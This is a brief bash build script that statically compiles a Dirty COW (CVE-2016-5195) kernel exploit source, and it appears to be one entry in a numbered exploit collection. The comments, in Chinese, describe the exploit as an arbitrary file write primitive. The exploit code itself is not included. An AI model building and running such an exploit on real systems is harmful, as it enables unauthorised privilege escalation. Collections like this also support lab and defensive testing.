#!/usr/bin/env bash
# 01dirtycow — CVE-2016-5195 Dirty COW（只读映射写，任意文件写原语）
# 用法: build.sh <outdir> [gnu|musl]   默认 gnu；musl 需 musl-gcc 或 alpine 容器
set -euo pipefail
OUT="${1:?usage: build.sh <outdir> [gnu|musl]}"
cd "$(dirname "$0")"
mkdir -p "$OUT"
${CC:-gcc} -pthread -static -O2 -o "$OUT/dirtyc0w" dirtyc0w/dirtyc0w.c
echo "[01dirtycow] -> $OUT/dirtyc0w"
